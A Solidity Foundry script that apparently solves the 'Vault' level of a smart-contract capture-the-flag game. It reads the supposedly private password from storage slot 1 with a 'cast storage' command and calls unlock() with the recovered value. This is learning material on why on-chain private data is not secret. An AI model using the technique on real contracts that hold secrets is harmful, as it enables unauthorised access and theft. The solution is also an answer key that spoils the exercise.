// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/level8/Vault.sol";

// Objective:
// Unlock the vault to pass the level!

contract POC is Script {
    Vault instance = Vault(0x1A9Fd23530ed8bE640775ecd69be94C6CECd0806);

    function run() external {
        vm.startBroadcast();
        console.log("Locked:::", instance.locked());

        // Run this command in the terminal to obtain password
        // cast storage <instance address> 1 --rpc-url $RPC_URL

        instance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);

        console.log("Locked:::", instance.locked());
    }
}
